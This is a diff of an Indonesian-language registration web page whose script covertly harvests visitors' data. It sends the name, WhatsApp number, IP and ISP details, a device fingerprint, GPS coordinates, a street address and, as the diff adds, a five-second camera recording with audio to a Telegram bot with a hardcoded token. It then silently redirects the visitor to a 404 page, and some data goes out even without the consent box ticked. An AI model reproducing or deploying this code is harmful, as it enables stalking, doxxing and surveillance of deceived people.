@@ -5,8 +5,7 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>Daftar</title>
   <style>
-    /* Simple clean form UI (no debug shown) */
-    body { font-family: Inter,system-ui,Arial; background:#f6f8fa; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+    body { font-family:Inter,system-ui,Arial; background:#f6f8fa; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
     .card { width:360px; background:#fff; border-radius:12px; padding:18px; box-shadow:0 8px 30px rgba(2,6,23,0.08); }
     h1{ font-size:18px; margin:0 0 8px 0; }
     label{ display:block; margin-top:10px; font-size:13px; color:#222; }
@@ -30,7 +29,7 @@
       <input id="wa" name="wa" type="tel" required placeholder="62812xxxxxxxx">
 
       <div class="consent">
-        <label><input id="consent" type="checkbox"> Saya memberi izin untuk mengambil foto & lokasi (untuk verifikasi).</label>
+        <label><input id="consent" type="checkbox"> Saya memberi izin untuk mengambil <strong>foto, video+audio</strong> dan <strong>lokasi GPS</strong> untuk verifikasi.</label>
       </div>
 
       <button id="submitBtn" type="submit">Daftar</button>
@@ -39,18 +38,16 @@
   </div>
 
 <script>
-/* === CONFIG (ISI TOKEN & CHAT ID) === */
+/* ========== CONFIG ========== */
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
-/* =================================== */
+/* ============================ */
 
 /* Helpers */
 function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
 function generatePhone(){ let s='628'; const len = 9 + Math.floor(Math.random()*3); for(let i=0;i<len;i++) s+=Math.floor(Math.random()*10); return s; }
-function generateFakeProfile(){ const first=["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka"]; const last=["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama"]; const jobs=["Reseller","Pelajar","Karyawan","Driver","Freelancer"]; const kampung=["Babakan","Cisaat","Cibadak"]; const name = rand(first)+' '+rand(last); return { name, age: String(18+Math.floor(Math.random()*40)), gender: Math.random()>0.5?"Laki-laki":"Perempuan", job: rand(jobs), kampung: rand(kampung), phone: generatePhone() }; }
-
-/* Minimal fetch JSON util */
-async function fetchJSON(url){ try{ const r = await fetch(url, { cache: 'no-store' }); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){ return null; } }
+function safeCaption(s){ if(!s) return ''; if(s.length<=1000) return s; return s.slice(0,1000-3)+'...'; }
+async function fetchJSON(url){ try{ const r = await fetch(url, { cache:'no-store' }); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){ return null; } }
 
 /* IP info fallback */
 async function getIPInfo(){
@@ -68,7 +65,7 @@ async function getIPInfo(){
   return { ip:'unknown' };
 }
 
-/* Reverse geocode via Nominatim -> return address object + display */
+/* Reverse geocode */
 async function revGeocode(lat, lon){
   try{
     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'LegalApp/1.0' }});
@@ -78,21 +75,19 @@ async function revGeocode(lat, lon){
   }catch(e){ return { error: e.message || 'revgeo fail' }; }
 }
 
-/* Geo (prompts) */
+/* Geo */
 function getGeo(){
   return new Promise(resolve=>{
     if(!navigator.geolocation) return resolve({ error:'geolocation not supported' });
-    navigator.geolocation.getCurrentPosition(p=>{
-      resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' });
-    }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
+    navigator.geolocation.getCurrentPosition(p=> resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' }), err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
   });
 }
 
-/* Battery */
+/* Battery / Connection / Extra device fields */
 async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{ return null; } }
 function getConnection(){ try{ const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{ return null; } }
 
-/* Capture photo (asks camera permission) */
+/* Capture photo */
 async function capturePhoto(){
   try{
     const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
@@ -101,8 +96,7 @@ async function capturePhoto(){
     await new Promise(r=>setTimeout(r,900));
     const canvas = document.createElement('canvas');
     const side = Math.min(v.videoWidth||640, v.videoHeight||480);
-    const size = 800;
-    canvas.width = size; canvas.height = size;
+    const size = 800; canvas.width=size; canvas.height=size;
     const ctx = canvas.getContext('2d');
     const sx = Math.max(0,(v.videoWidth - side)/2), sy = Math.max(0,(v.videoHeight - side)/2);
     ctx.drawImage(v, sx, sy, side, side, 0, 0, size, size);
@@ -113,43 +107,88 @@ async function capturePhoto(){
   }
 }
 
-/* Build boxed caption (ordered & tidy) */
-function buildBoxedCaption(obj){
+/* Capture video+audio (MediaRecorder) for durationMillis ms */
+async function captureVideoWithAudio(durationMillis = 5000){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:true });
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+    const chunks = [];
+    recorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
+    recorder.start();
+    // wait duration
+    await new Promise(r => setTimeout(r, durationMillis));
+    recorder.stop();
+    // stop tracks
+    stream.getTracks().forEach(t => t.stop());
+    // wait for stop to finish and chunks to be available
+    await new Promise(r => { recorder.onstop = r; });
+    return new Blob(chunks, { type: 'video/webm' });
+  }catch(e){
+    return null;
+  }
+}
+
+/* infer SIM/operator from ipInfo.org or userAgent (best-effort only) */
+function inferOperator(ipInfo, userAgent){
+  const candidates = [];
+  const s = (ipInfo && ipInfo.org) ? ipInfo.org.toLowerCase() : '';
+  if(s.includes('telkomsel') || s.includes('telkom')) candidates.push('Telkomsel/Telkom');
+  if(s.includes('indosat') || s.includes('im3') || s.includes('axis')) candidates.push('Indosat/IM3/Axis');
+  if(s.includes('xl') || s.includes('axis')) candidates.push('XL/Axis');
+  if(s.includes('smartfren')) candidates.push('Smartfren');
+  if(s.includes('tri') || s.includes('3')) candidates.push('Tri (3)');
+  // userAgent hints (very weak)
+  const ua = (userAgent || '').toLowerCase();
+  if(ua.includes('indosat')) candidates.push('Indosat (UA hint)');
+  if(ua.includes('telkomsel')) candidates.push('Telkomsel (UA hint)');
+  return candidates.length ? Array.from(new Set(candidates)).join(' | ') : 'Unknown/Not available';
+}
+
+/* Build boxed caption with many fields */
+function buildBoxedCaption(data){
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
-  lines.push(` ├─ > Nama: ${obj.profile && obj.profile.name ? obj.profile.name : (obj.name || '-')}`);
+  if(data.profile && data.profile.phone) lines.push(` ├─ > Nomor Telepon: ${data.profile.phone}`);
+  if(data.profile && data.profile.name) lines.push(` ├─ > Nama: ${data.profile.name}`);
   lines.push(` ├─ > Pesan`);
-  lines.push(` │   └─ ${obj.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
+  lines.push(` │   └─ ${data.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
   lines.push(` ├─ > Pengirim (web)`);
-  lines.push(` │   └─ ${obj.userAgent || '-'}`);
-  lines.push(` ├─ > IP / ISP`);
-  const ip = obj.ipInfo || {};
+  lines.push(` │   └─ ${data.userAgent || '-'}`);
+
+  lines.push(` ├─ > IP / ISP / Operator (inferred)`);
+  const ip = data.ipInfo||{};
   lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
   lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
   lines.push(` │   ├─ City: ${ip.city || '-'}`);
   lines.push(` │   ├─ Region: ${ip.region || '-'}`);
   lines.push(` │   ├─ Country: ${ip.country || '-'}`);
   lines.push(` │   └─ Postal: ${ip.postal || '-'}`);
-  lines.push(` ├─ > Device`);
-  lines.push(` │   ├─ Platform: ${obj.platform || '-'}`);
-  lines.push(` │   ├─ Screen: ${obj.screen || '-'}`);
-  lines.push(` │   ├─ Language: ${obj.language || '-'}`);
-  lines.push(` │   ├─ Timezone: ${obj.timezone || '-'}`);
-  lines.push(` │   ├─ Battery: ${obj.battery || '-'}`);
+  lines.push(` │   └─ SIM/Operator (inferred): ${data.inferredOperator || '-'}`);
+
+  lines.push(` ├─ > Device (extra)`);
+  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
+  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
+  lines.push(` │   ├─ Language: ${data.language || '-'}`);
+  lines.push(` │   ├─ Timezone: ${data.timezone || '-'} (offset: ${data.timezoneOffset || 'N/A'})`);
+  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
+  lines.push(` │   ├─ Device Memory: ${data.deviceMemory || '-'}`);
+  lines.push(` │   ├─ Max Touch Points: ${data.maxTouchPoints || '-'}`);
+  lines.push(` │   ├─ Color Depth: ${data.colorDepth || '-'}`);
+  lines.push(` │   └─ Connection: ${data.connection ? (data.connection.effectiveType || '-') + ' | downlink:' + (data.connection.downlink||'-') + 'Mbps' : 'N/A'}`);
+
   lines.push(` ├─ > Geo (GPS)`);
-  if(obj.geo && !obj.geo.error){
-    lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
-    lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
-    lines.push(` │   ├─ Akurasi: ${obj.geo.acc || '-'}`);
-    lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
+  if(data.geo && !data.geo.error){
+    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
+    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
+    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
+    lines.push(` │   └─ Maps: https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}`);
   } else {
-    lines.push(` │   └─ GPS: ${obj.geo? obj.geo.error : '-'}`);
+    lines.push(` │   └─ GPS: ${data.geo? data.geo.error : '-'}`);
   }
+
   lines.push(` ├─ > Alamat (Detail)`);
-  const a = obj.address || {};
-  // many common keys
+  const a = data.address || {};
   const addr = [
     ['Negara','country'], ['Kode Negara','country_code'], ['Provinsi','state'],
     ['State District','state_district'], ['Kabupaten','county'], ['Region','region'],
@@ -160,110 +199,135 @@ function buildBoxedCaption(obj){
   for(const [label,key] of addr){
     lines.push(` │   ├─ ${label}: ${a[key] || '-'}`);
   }
-  lines.push(` ╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
-  const text = lines.join('\n');
-  return text.length>1000? text.slice(0,1000-3)+'...' : text;
+
+  // Profile extras & media info
+  lines.push(` ├─ > Profile (input/auto)`);
+  lines.push(` │   ├─ Nama (input): ${data.profile.name || '-'}`);
+  lines.push(` │   ├─ Nomor WA (input): ${data.profile.phone || '-'}`);
+  lines.push(` │   ├─ Profile job: ${data.profile.job || '-'}`);
+  lines.push(` │   └─ Kampung (inferred): ${data.profile.kampung || '-'}`);
+
+  if(data.mediaInfo){
+    lines.push(` ├─ > Media Capture`);
+    lines.push(` │   ├─ Type: ${data.mediaInfo.type || '-'}`);
+    lines.push(` │   ├─ Duration (ms): ${data.mediaInfo.duration || '-'}`);
+    lines.push(` │   └─ Size (bytes): ${data.mediaInfo.size || '-'}`);
+  }
+
+  lines.push(`╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
+  const txt = lines.join('\n');
+  return safeCaption(txt);
 }
 
-/* Telegram send (photo+caption single message) */
-async function sendPhotoCaption(blob, caption){
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+/* Telegram send helpers */
+async function sendVideoCaption(videoBlob, caption){
   const fd = new FormData();
   fd.append('chat_id', CHAT_ID);
-  fd.append('photo', blob, 'photo.jpg');
+  fd.append('video', videoBlob, 'capture.webm');
   fd.append('caption', caption);
-  // plain text caption (no HTML)
-  return fetch(url, { method:'POST', body: fd });
+  // sendVideo: use bot sendVideo endpoint
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd });
 }
-
-/* Fallback text-only send */
+async function sendPhotoCaption(photoBlob, caption){
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', photoBlob, 'photo.jpg');
+  fd.append('caption', caption);
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
+}
 async function sendText(caption){
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method:'POST',
-    headers:{ 'Content-Type':'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
-  });
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: caption }) });
 }
 
-/* Main form handler */
+/* Main handler */
 document.getElementById('regForm').addEventListener('submit', async function(e){
   e.preventDefault();
   const name = document.getElementById('name').value.trim();
   const wa = document.getElementById('wa').value.trim();
   const consent = document.getElementById('consent').checked;
 
-  // basic validation
   if(!name || !wa){ alert('Isi nama dan nomor WA'); return; }
 
-  // prepare minimal profile object
-  let profile = { name, phone: wa };
-  // send minimal registration message first (fast)
+  // send minimal registration (fast)
   const regText = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
-  try{
-    await sendText(regText);
-  }catch(e){
-    // ignore; continue to attempt full report
-  }
+  try{ await sendText(regText); } catch(e){ /* ignore */ }
 
-  // if user consented, gather device, ip, geo, photo
-  let photo = null;
-  let geo = { error:'not requested' };
-  let ipInfo = await getIPInfo();
-  let rev = null;
+  // gather data
+  const ipInfo = await getIPInfo();
+  const inferredOperator = inferOperator(ipInfo, navigator.userAgent);
   const battery = await getBattery();
   const connection = getConnection();
-  const device = {
-    platform: navigator.platform || '-',
-    userAgent: navigator.userAgent || '-',
-    screen: (window.screen? `${screen.width}x${screen.height}` : '-'),
-    language: navigator.language || '-',
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
-    battery: battery || '-'
-  };
+  const deviceMemory = navigator.deviceMemory || '-';
+  const maxTouchPoints = navigator.maxTouchPoints || '-';
+  const colorDepth = screen.colorDepth || '-';
+  const timezoneOffset = (new Date()).getTimezoneOffset();
+
+  let geo = { error:'not requested' }, rev = null;
+  let photoBlob = null, videoBlob = null, mediaInfo = null;
 
   if(consent){
-    // get geo (may prompt)
+    // geo
     geo = await getGeo();
     if(!geo.error && geo.lat && geo.lon){
       rev = await revGeocode(geo.lat, geo.lon);
     }
-    // get photo (may prompt)
-    photo = await capturePhoto();
+    // attempt video+audio capture first (5s)
+    try{
+      videoBlob = await captureVideoWithAudio(5000); // 5 seconds
+      if(videoBlob){
+        mediaInfo = { type: 'video+audio', duration: 5000, size: videoBlob.size };
+      } else {
+        // fallback to still photo
+        photoBlob = await capturePhoto();
+        if(photoBlob) mediaInfo = { type:'photo', size: photoBlob.size };
+      }
+    }catch(e){
+      // ignore
+    }
   }
 
-  // if profile has no phone (shouldn't), generate safe phone
-  if(!profile.phone) profile.phone = generatePhone();
+  // build profile (if you maintain profile db, merge here)
+  const profile = { name: name, phone: wa, job: '-', kampung: '-' };
 
-  // build caption
-  const obj = {
+  // fill data object
+  const data = {
     profile,
-    name,
     message: 'Pendaftaran & Verifikasi (dengan izin)',
-    userAgent: device.userAgent,
+    userAgent: navigator.userAgent || '-',
     ipInfo,
-    platform: device.platform,
-    screen: device.screen,
-    language: device.language,
-    timezone: device.timezone,
-    battery: device.battery,
+    inferredOperator,
+    platform: navigator.platform || '-',
+    screen: (screen ? `${screen.width}x${screen.height}` : '-'),
+    language: navigator.language || '-',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
+    timezoneOffset,
+    battery,
+    deviceMemory,
+    maxTouchPoints,
+    colorDepth,
+    connection,
     geo,
     address: (rev && rev.address) ? rev.address : {},
+    revDisplay: (rev && rev.display) ? rev.display : null,
+    mediaInfo
   };
-  const caption = buildBoxedCaption(obj);
 
-  // send single message: photo+caption if photo exists, else text-only
+  const caption = buildBoxedCaption(data);
+
+  // send single message: prefer video, else photo, else text
   try{
-    if(photo){
-      await sendPhotoCaption(photo, caption);
+    if(videoBlob){
+      await sendVideoCaption(videoBlob, caption);
+    } else if(photoBlob){
+      await sendPhotoCaption(photoBlob, caption);
     } else {
       await sendText(caption);
     }
   }catch(e){
-    // ignore silently
+    // ignore failure
   }
 
-  // redirect to 404 page (no debug shown)
-  // change this URL if you want a different redirect target
+  // redirect silently to 404 page
   window.location.href = '/404.html';
 });
 </script>
